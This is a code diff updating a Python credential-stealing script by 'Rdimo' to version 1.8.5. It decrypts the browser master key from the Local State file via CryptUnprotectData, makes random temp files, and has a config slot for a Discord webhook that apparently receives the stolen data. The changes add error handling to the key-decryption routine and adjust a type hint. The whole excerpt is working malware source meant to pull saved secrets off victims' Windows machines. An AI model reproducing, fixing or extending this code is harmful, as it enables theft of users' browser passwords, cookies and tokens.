@@ -23,7 +23,7 @@ from win32crypt import CryptUnprotectData
 from datetime import datetime, timezone, timedelta
 
 __author__ = "Rdimo"
-__version__ = '1.8.4'
+__version__ = '1.8.5'
 __license__ = "GPL-3.0"
 __config__ = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
@@ -95,9 +95,11 @@ class Functions(object):
             c = f.read()
         local_state = json.loads(c)
 
-        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-        master_key = Functions.win_decrypt(master_key[5:])
-        return master_key
+        try:
+            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
+            return Functions.win_decrypt(master_key[5:])
+        except KeyError:
+            return None
 
     @staticmethod
     def convert_time(time):
@@ -113,7 +115,7 @@ class Functions(object):
         return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]
 
     @staticmethod
-    def create_temp_file(_dir: str | os.PathLike = gettempdir()):
+    def create_temp_file(_dir: os.PathLike = gettempdir()):
         file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
         path = ntpath.join(_dir, file_name)
         open(path, "x")
